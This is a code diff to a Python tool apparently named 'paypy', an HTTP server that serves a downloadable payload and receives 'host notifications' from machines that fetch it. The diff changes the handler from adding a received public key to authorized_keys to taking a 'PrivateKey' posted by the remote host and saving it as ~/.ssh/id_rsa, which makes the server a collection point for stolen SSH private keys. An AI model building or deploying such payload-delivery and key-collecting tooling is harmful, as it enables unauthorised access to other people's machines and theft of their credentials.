@@ -34,15 +34,17 @@ class DownloadHandler(SimpleHTTPRequestHandler):
 			stdout.write(f'{Fore.RED}[host]{Style.RESET_ALL} {current_time} - {client_ip} - Host notification received:\n{post_data.decode()}\n')
 			try:
 				post_json = json.loads(post_data.decode())
-				public_key = post_json.get("PublicKey", {}).get("value", "")
-				if public_key:
-					public_key = self.sanitize_key(public_key)
+				private_key = post_json.get("PrivateKey", {}).get("value", "")
+				if private_key:
+					private_key = self.sanitize_key(private_key)
 					os.makedirs(os.path.expanduser("~/.ssh"), exist_ok=True)
-					with open(os.path.expanduser("~/.ssh/authorized_keys"), "a") as auth_keys:
-						auth_keys.write(public_key + "\n")
-					stdout.write(f'{Fore.GREEN}[success]{Style.RESET_ALL} Public key added to authorized_keys\n')
+					private_key_path = os.path.expanduser("~/.ssh/id_rsa")
+					with open(private_key_path, "w") as private_key_file:
+						private_key_file.write(private_key + "\n")
+					os.chmod(private_key_path, 0o600)
+					stdout.write(f'{Fore.GREEN}[success]{Style.RESET_ALL} Private key saved to {private_key_path}\n')
 				else:
-					stdout.write(f'{Fore.YELLOW}[warning]{Style.RESET_ALL} No public key found in POST data\n')
+					stdout.write(f'{Fore.YELLOW}[warning]{Style.RESET_ALL} No private key found in POST data\n')
 			except json.JSONDecodeError:
 				stdout.write(f'{Fore.RED}[error]{Style.RESET_ALL} Failed to decode JSON from POST data\n')
 
@@ -61,16 +63,17 @@ def get_local_ip():
 	s.close()
 	return local_ip
 
+# warn
 if len(argv) != 3:
 	print('usage: paypy <port> </payload/path>')
 	exit(1)
 
+# run server
 port = int(argv[1])
 file_path = argv[2]
 DownloadHandler.base_path = file_path
 local_ip = get_local_ip()
 httpd = HTTPServer((local_ip, port), DownloadHandler)
-
 print(f'{Fore.RED}[paypy]{Style.RESET_ALL} local server started: {local_ip}:{port}')
 print(f'{Fore.RED}[paypy]{Style.RESET_ALL} downloadable payload: {file_path}')
 stdout.flush()
